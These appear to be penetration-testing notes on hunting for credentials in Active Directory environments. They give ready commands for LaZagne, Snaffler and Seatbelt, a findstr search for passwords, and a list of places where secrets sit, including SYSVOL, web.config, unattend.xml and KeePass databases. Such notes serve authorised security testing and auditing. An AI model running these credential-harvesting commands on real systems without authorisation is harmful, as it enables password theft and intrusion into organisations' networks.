---
tags:
  - AD
---
## LaZagne
---
[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
Hunt for passwords stored in commonly used software.
All modules
```powershell
laZagne.exe all
laZagne.exe all -output C:\Windows\Tasks
```
Decrypt domain creds (requires current users password)
```powersehll
laZagne.exe all -password <PASS>
```
## Snaffler
---
[https://github.com/SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)
Will spider shares and readable directories for common credential patterns
```PowerShell
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
## Seatbelt
---
[https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
performs security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. Sometimes finding creds.
```bat
Seatbelt.exe -group=all -outputfile="C:\Windows\Tasks\all.txt"
```

## Manual Approach
---
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)